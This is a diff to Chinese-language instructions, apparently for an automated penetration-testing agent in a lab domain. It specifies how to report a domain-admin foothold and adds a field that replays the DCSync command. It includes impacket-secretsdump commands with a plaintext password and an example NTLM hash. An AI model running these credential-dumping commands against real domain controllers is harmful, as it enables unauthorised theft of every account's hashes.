@@ -64,12 +64,15 @@ impacket-secretsdump -dc-ip <DC-ip> 'veritas.lab/<daUser>:<pass>'@<DC-ip> -just-
 
 **登记（证据必须逐字可溯源，否则验证层判未验证）**：
 - `location` = **裸 DC 标识**（`<DC-ip>` 或 `lab-dc.veritas.lab`），和你命令里出现的一字不差，**别加括号/IP 注释**；
-- `evidence` = **secretsdump 输出里那一整行原样粘贴**，别写成流程描述。例：
+- `evidence` = **secretsdump 输出里那一整行原样粘贴**，别写成流程描述；
+- `replay.verify_command` = **你刚跑通的那条 DCSync 命令原样**（引擎会【主动重跑一次】坐实——输出里再次出现 RID-500/krbtgt 行才算 verified；没它只能退回被动验证）。例：
 ```
 report_foothold(access_level="domain_admin",
   label="domain_admin via svc-sql DCSync",
   location="203.0.113.10",
-  evidence="labadmin:500:aad3b435b51404eeaad3b435b51404ee:06041b8e7d11a3a30ff936efc56e47e8:::")
+  evidence="labadmin:500:aad3b435b51404eeaad3b435b51404ee:06041b8e7d11a3a30ff936efc56e47e8:::",
+  replay={"verify_command": "impacket-secretsdump -dc-ip 203.0.113.10 'veritas.lab/svc-sql:Password1'@203.0.113.10 -just-dc",
+          "domain": "veritas.lab", "target": "203.0.113.10"})
 ```
 再 `report_loot` 记这些 hash。
 > ⚠️ 反例（会被判未验证）：location 写 `lab-dc.veritas.lab (203.0.113.10)`（带括号命令里找不到）、evidence 写 `“ldapsearch 确认…john 破出 Password1”`（叙述没有可逐字溯源的 token）。
